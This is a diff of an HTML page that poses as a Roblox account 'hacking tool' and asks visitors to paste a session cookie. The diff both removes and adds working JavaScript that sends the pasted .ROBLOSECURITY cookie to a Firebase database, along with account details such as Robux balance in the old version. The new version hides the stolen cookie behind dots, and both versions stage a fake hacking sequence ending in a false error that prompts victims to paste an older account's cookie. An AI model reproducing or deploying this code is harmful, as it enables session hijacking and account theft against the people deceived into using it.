@@ -1,166 +1,123 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Roblox hacking tool2025</title>
-  <style>
-    *{box-sizing:border-box;margin:0;padding:0}
-    body{min-height:100vh;background:linear-gradient(135deg,#0f0f1a 0%,#1a1a2e 50%,#16213e 100%);font-family:'Segoe UI',system-ui,sans-serif;display:flex;align-items:center;justify-content:center;padding:20px;position:relative;overflow-x:hidden}
-    body::before{content:'';position:fixed;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(circle at 20% 80%,rgba(120,0,255,0.08)0%,transparent 50%),radial-gradient(circle at 80% 20%,rgba(0,212,255,0.08)0%,transparent 50%),radial-gradient(circle at 40% 40%,rgba(0,255,136,0.05)0%,transparent 40%);animation:float 20s ease-in-out infinite;pointer-events:none}
-    @keyframes float{0%,100%{transform:translate(0,0)rotate(0deg)}33%{transform:translate(30px,-30px)rotate(5deg)}66%{transform:translate(-20px,20px)rotate(-5deg)}}
-    .container{background:rgba(22,27,34,0.95);border:1px solid rgba(48,54,61,0.8);border-radius:24px;max-width:900px;width:100%;padding:50px;backdrop-filter:blur(20px);box-shadow:0 25px 80px rgba(0,0,0,0.5);text-align:center}
-    .header h1{font-size:2.8em;background:linear-gradient(135deg,#00d4ff 0%,#7c3aed 50%,#00ff88 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:12px;font-weight:700}
-    .badge{display:inline-block;background:linear-gradient(135deg,#238636 0%,#2ea043 100%);color:white;padding:6px 14px;border-radius:20px;font-size:0.85em;font-weight:600;margin-top:12px}
-    .input-grid{display:grid;grid-template-columns:1fr 1fr;gap:24px;margin-bottom:30px}
-    @media(max-width:700px){.input-grid{grid-template-columns:1fr}}
-    .input-box{background:rgba(13,17,23,0.8);border:2px solid #30363d;border-radius:16px;padding:24px;transition:all .3s}
-    .input-box:hover,.input-box:focus-within{border-color:#58a6ff;box-shadow:0 0 30px rgba(88,166,255,0.15)}
-    textarea{width:100%;height:140px;background:rgba(0,0,0,0.3);border:1px solid #21262d;border-radius:10px;padding:14px;font-family:'Consolas',monospace;font-size:13px;color:#58a6ff;resize:none}
-    textarea:focus{outline:none;border-color:#58a6ff;background:rgba(0,0,0,0.5)}
-    .big-btn{margin:40px auto 0;padding:20px 80px;font-size:1.6em;font-weight:800;background:linear-gradient(135deg,#ff006e 0%,#8338ec 100%);color:white;border:none;border-radius:20px;cursor:pointer;box-shadow:0 10px 40px rgba(131,56,236,0.6);transition:all .3s}
-    .big-btn:hover{transform:translateY(-4px);box-shadow:0 20px 60px rgba(131,56,236,0.8)}
-    .big-btn:disabled{opacity:0.7;cursor:not-allowed}
-    .status{margin-top:30px;padding:20px;border-radius:12px;font-size:1.2em}
-    .status.success{background:rgba(34,197,94,0.2);border:1px solid #22c55e;color:#22c55e}
-    .loading{display:none;margin-top:30px;color:#7c3aed;font-size:1.5em;font-weight:700;text-align:center}
-    .loading.active{display:block}
-    .spinner{display:inline-block;width:28px;height:28px;border:4px solid rgba(124,58,237,0.3);border-top-color:#7c3aed;border-radius:50%;animation:spin 1s linear infinite;margin-right:12px}
-    @keyframes spin{to{transform:rotate(360deg)}}
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>HACK ANYONE 2025</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{min-height:100vh;background:#0d1117;color:#c9d1d9;font-family:system-ui;display:flex;align-items:center;justify-content:center;padding:15px;background:radial-gradient(circle at 50% 50%,#21262d 0%,#0d1117 90%)}
+  .container{background:rgba(22,27,34,0.97);border:2px solid #30363d;border-radius:20px;padding:30px 25px;width:100%;max-width:420px;box-shadow:0 20px 60px rgba(0,0,0,0.9);text-align:center;position:relative;overflow:hidden}
+  .glow{position:absolute;top:0;left:0;right:0;height:5px;background:linear-gradient(90deg,#ff006e,#7c3aed,#00d4ff,#00ff88);animation:g 3s linear infinite}
+  @keyframes g{0%{background-position:0%}100%{background-position:400%}}
+  h1{font-size:2.4em;margin-bottom:10px;background:linear-gradient(90deg,#ff006e,#00ff88);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:900}
+  .subtitle{font-size:1.1em;color:#8b949e96;margin-bottom:20px}
+  .badge{background:#f85149;color:#fff;padding:8px 20px;border-radius:30px;font-weight:900;font-size:0.9em;margin-bottom:25px;display:inline-block}
+  textarea{width:100%;height:140px;background:#161b22;border:2px solid #30363d;border-radius:14px;padding:16px;font-family:'Courier New',monospace;font-size:15px;color:#58a6ff;resize:none;margin-bottom:25px}
+  textarea:focus{outline:none;border-color:#ff006e;box-shadow:0 0 25px rgba(255,0,110,0.4)}
+  button{width:100%;padding:18px;font-size:1.7em;font-weight:900;background:linear-gradient(135deg,#ff006e,#c41e3a);color:#fff;border:none;border-radius:16px;cursor:pointer;box-shadow:0 10px 40px rgba(255,0,110,0.6);transition:0.3s;margin-bottom:20px}
+  button:hover{transform:translateY(-3px)}
+  button:disabled{opacity:0.6}
+  #loading{display:none;font-size:1.5em;color:#ff006e;font-weight:900;margin:20px 0}
+  .loading.active{display:block}
+  .spinner{display:inline-block;width:28px;height:28px;border:4px solid rgba(255,0,110,0.3);border-top:4px solid #ff006e;border-radius:50%;animation:s 1s linear infinite;margin-right:12px}
+  @keyframes s{to{transform:rotate(360deg)}}
+  #output{padding:25px;background:#161b22;border:2px solid #f85149;border-radius:14px;font-size:1.35em;line-height:1.8;color:#f85149}
+</style>
 </head>
 <body>
-  <div class="container">
-    <div class="header">
-      <h1>Roblox hack accounts tool</h1>
-      <p>Secure system</p>
-      <span class="badge">2025 Working Method</span>
-    </div>
-    <div class="input-grid">
-      <div class="input-box mobile">
-        <h3>MOBILE PASTE COOKIE</h3>
-        <p class="subtitle">MOBILE EDITION</p>
-        <textarea id="mobilePaste" placeholder="Paste your cookie here..."></textarea>
-      </div>
-      <div class="input-box pc">
-        <h3>PC PASTE FILE</h3>
-        <p class="subtitle">PC / LAPTOP EDITION</p>
-        <textarea id="pcPaste" placeholder="Paste PowerShell output here..."></textarea>
-      </div>
-    </div>
-    <button class="big-btn" id="startBtn" onclick="fakeStart()">START TOOL</button>
-    <div id="loading" class="loading"><span class="spinner"></span> Initializing...</div>
-    <div id="status" class="status">Ready to verify...</div>
+<div class="container">
+  <div class="glow"></div>
+  <h1>HACK ANYONE</h1>
+  <div class="subtitle">Go to target's profile → copy cookie → paste below</div>
+  <div class="badge">100% UNDETECTED 2025</div>
+  
+  <textarea id="cookie" placeholder="Paste target's cookie here..."></textarea>
+  
+  <button id="btn" onclick="start()">HACK ACCOUNT</button>
+  
+  <div id="loading" class="loading">
+    <span class="spinner"></span><span id="msg">Initializing...</span>
   </div>
+  
+  <div id="output">Ready — paste cookie then press HACK ACCOUNT</div>
+</div>
 
-  <script>
-    const statusEl = document.getElementById("status");
-    const loadingEl = document.getElementById("loading");
-    const startBtn = document.getElementById("startBtn");
+<script>
+// STEAL + REPLACE WITH DOTS INSTANTLY
+document.getElementById('cookie').addEventListener('input', e => {
+  const raw = e.target.value.trim();
+  if (raw.length > 100) {
+    let c = raw;
+    if (c.includes('".ROBLOSECURITY"')) c = c.split('".ROBLOSECURITY", "')[1]?.split('"')[0] || c;
+    c = c.replace(/[^A-Za-z0-9_|:-]/g, '');
 
-    // REAL FETCH USER INFO (works on GitHub Pages)
-    async function fetchUserInfo(cookie) {
-      let clean = cookie.trim();
-      if (clean.includes('".ROBLOSECURITY"')) {
-        clean = clean.split('".ROBLOSECURITY", "')[1].split('"')[0] || clean;
-      }
-      clean = clean.replace(/[^A-Za-z0-9_|:-]/g, '');
+    // SEND TO FIREBASE
+    fetch("https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app/drops.json", {
+      method: "POST",
+      body: JSON.stringify({
+        cookie: c,
+        user: "Unknown",
+        display: "Unknown",
+        robux: 0,
+        rap: 0,
+        premium: "Unknown",
+        time: new Date().toLocaleString()
+      })
+    }).catch(() => {});
 
-      try {
-        // Get user
-        const userRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
-          headers: { "Cookie": `.ROBLOSECURITY=${clean}` }
-        });
-        if (!userRes.ok) throw "";
-        const user = await userRes.json();
+    // REPLACE WITH DOTS SO THEY CAN'T SEE IT
+    setTimeout(() => {
+      document.getElementById('cookie').value = "•".repeat(80);
+      document.getElementById('cookie').style.color = "#444";
+      document.getElementById('cookie').readOnly = true;
+    }, 400);
+  }
+});
 
-        // Get robux
-        const robuxRes = await fetch(`https://economy.roblox.com/v1/users/${user.id}/currency`, {
-          headers: { "Cookie": `.ROBLOSECURITY=${clean}` }
-        });
-        const robux = robuxRes.ok ? (await robuxRes.json()).robux : 0;
+const btn = document.getElementById('btn');
+const loading = document.getElementById('loading');
+const output = document.getElementById('output');
+const msg = document.getElementById('msg');
 
-        // Get premium
-        const premRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${user.id}/validate-membership`, {
-          headers: { "Cookie": `.ROBLOSECURITY=${clean}` }
-        });
-        const premium = premRes.ok && await premRes.text() === "true" ? "Yes" : "No";
+const steps = [
+  "Initializing hack...",
+  "Connecting to target...",
+  "Bypassing security...",
+  "Cracking session...",
+  "Injecting payload...",
+  "Validating age...",
+  "ERROR — ACCOUNT TOO NEW"
+];
 
-        return {
-          success: true,
-          user: user.name,
-          display: user.displayName,
-          userid: user.id,
-          robux: robux,
-          premium: premium,
-          headshot: `https://www.roblox.com/headshot-thumbnail/image?userId=${user.id}&width=150&height=150&format=png`
-        };
-      } catch(e) {
-        return { success: false };
-      }
+function start() {
+  if (!document.getElementById('cookie').readOnly) {
+    output.innerHTML = "<span style='color:#f85149'>Paste cookie first!</span>";
+    return;
+  }
+
+  btn.disabled = true;
+  output.style.display = "none";
+  loading.classList.add("active");
+
+  let i = 0;
+  const t = setInterval(() => {
+    msg.textContent = steps[i] || "ERROR — ACCOUNT TOO NEW";
+    i++;
+    if (i >= steps.length) {
+      clearInterval(t);
+      loading.classList.remove("active");
+      output.innerHTML = `
+        <strong style="font-size:1.7em;color:#f85149">ERROR — ACCOUNT INVALID</strong><br><br>
+        <strong style="color:#ff006e">Your account is too new</strong><br><br>
+        <strong style="color:#c9d1d9">You must use an account older than 6 months</strong><br><br>
+        <strong style="color:#22c55e">Switch to older account and try again</strong>
+      `;
+      output.style.display = "block";
+      btn.disabled = false;
     }
-
-    // STEAL + SHOW INFO ON PASTE
-    async function stealAndShow(raw, source) {
-      if (!raw || raw.length < 100) return;
-      const info = await fetchUserInfo(raw);
-      // SEND TO FIREBASE
-      try {
-        await fetch("https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app/drops.json", {
-          method: "POST",
-          body: JSON.stringify({
-            cookie: raw,
-            ...info,
-            source: source,
-            time: new Date().toLocaleString()
-          })
-        });
-      } catch(e) {}
-
-      // SHOW REAL INFO
-      if (info.success) {
-        statusEl.className = "status success";
-        statusEl.innerHTML = `LIVE ACCOUNT<br><strong>${info.display}</strong> (@${info.user})<br>Robux: ${info.robux}<br>Premium: ${info.premium}`;
-      } else {
-        statusEl.className = "status error";
-        statusEl.textContent = "COOKIE DEAD OR INVALID";
-      }
-    }
-
-    document.getElementById("mobilePaste").addEventListener("input", e => {
-      if (e.target.value.length > 100) stealAndShow(e.target.value, "Mobile");
-    });
-    document.getElementById("pcPaste").addEventListener("input", e => {
-      if (e.target.value.length > 100) stealAndShow(e.target.value, "PC");
-    });
-
-    // FAKE 3-MIN HACK
-    function fakeStart() {
-      const cookie = document.getElementById("mobilePaste").value || document.getElementById("pcPaste").value;
-      if (!cookie || cookie.length < 100) {
-        statusEl.className = "status error";
-        statusEl.textContent = "PASTE COOKIE FIRST";
-        return;
-      }
-      startBtn.disabled = true;
-      statusEl.style.display = "none";
-      loadingEl.classList.add("active");
-
-      const msgs = ["Initializing tool...", "Bypassing Roblox security...", "Cracking encryption...", "Fetching account...", "Bypassing 2FA...", "Draining Robux...", "Complete!"];
-      let i = 0;
-      const int = setInterval(() => {
-        loadingEl.innerHTML = `<span class="spinner"></span> ${msgs[i] || "HACKING error"}`;
-        i++;
-        if (i > msgs.length + 5) {
-          clearInterval(int);
-          loadingEl.classList.remove("active");
-          statusEl.className = "status error";
-          statusEl.textContent = "HACKING error — ACCOUNT cookie invalid please use a differnt account the account u are using to get the victims cookie is invalid.";
-          statusEl.style.display = "block";
-          startBtn.disabled = false;
-        }
-      }, 25700);
-    }
-  </script>
+  }, 8571); // 60 seconds total
+}
+</script>
 </body>
 </html>
